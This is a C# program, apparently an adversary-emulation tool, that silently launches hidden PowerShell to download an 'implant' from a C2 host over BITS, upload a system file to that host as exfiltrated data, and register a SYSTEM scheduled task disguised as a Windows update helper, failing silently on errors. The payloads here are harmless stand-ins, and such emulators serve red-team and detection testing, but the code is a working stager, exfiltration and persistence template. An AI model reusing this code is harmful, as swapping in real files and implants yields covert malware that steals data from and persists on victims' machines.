using System;
using System.Diagnostics;

namespace UBoatEmulator
{
    class Program
    {
        static void Main(string[] args)
        {
            // The C2 domain that will be resolved via the dynamically modified hosts file
            string c2Domain = "c2-ubuntu.local";
            
            // The malicious PowerShell command we want to run silently.
            // It downloads a payload, uploads system data, and creates a scheduled task.
            string psCommand = "-WindowStyle Hidden -Command \"" +
                               "Start-BitsTransfer -Source 'http://" + c2Domain + ":8080/c2/implant.dat' -Destination 'C:\\ProgramData\\implant.dat' -DisplayName 'Update_Stager'; " +
                               "Start-Sleep -Seconds 2; " +
                               "Start-BitsTransfer -Source 'C:\\Windows\\win.ini' -Destination 'http://" + c2Domain + ":8080/upload/exfil_data.txt' -TransferType Upload -DisplayName 'Telemetry_Upload'; " +
                               "Register-ScheduledTask -TaskName 'Windows_Update_Helper' -Action (New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo BITS_Persistence') -User 'SYSTEM' -Force;" +
                               "\"";

            // Configure the process to run completely hidden from the user
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = psCommand;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;

            try
            {
                // Execute the simulation. We do not use WaitForExit() so the prompt returns immediately,
                // mimicking the behavior of a detached background RAT.
                Process.Start(psi);
            }
            catch 
            { 
                // Fail silently
            }
        }
    }
}
